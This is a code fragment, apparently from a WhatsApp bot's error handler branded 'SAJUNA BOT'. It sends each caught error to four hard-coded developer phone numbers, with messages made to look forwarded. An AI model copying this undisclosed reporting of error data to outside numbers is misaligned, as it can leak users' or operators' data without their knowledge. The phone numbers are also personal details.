    denz.sendMessage(`6285231060063@s.whatsapp.net`, `─────「 *LOG ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer SAJUNA BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./sajuna.jpg')}}})
	denz.sendMessage(`628815887040@s.whatsapp.net`, `─────「 *LOG ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer SAJUNA BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./sajuna.jpg')}}})
	denz.sendMessage(`6289530480310@s.whatsapp.net`, `─────「 *LOG ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer SAJUNA BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./sajuna.jpg')}}})
	denz.sendMessage(`6282123384291@s.whatsapp.net`, `─────「 *LOG ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer SAJUNA BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./sajuna.jpg')}}})
	}
    }
    }
    }
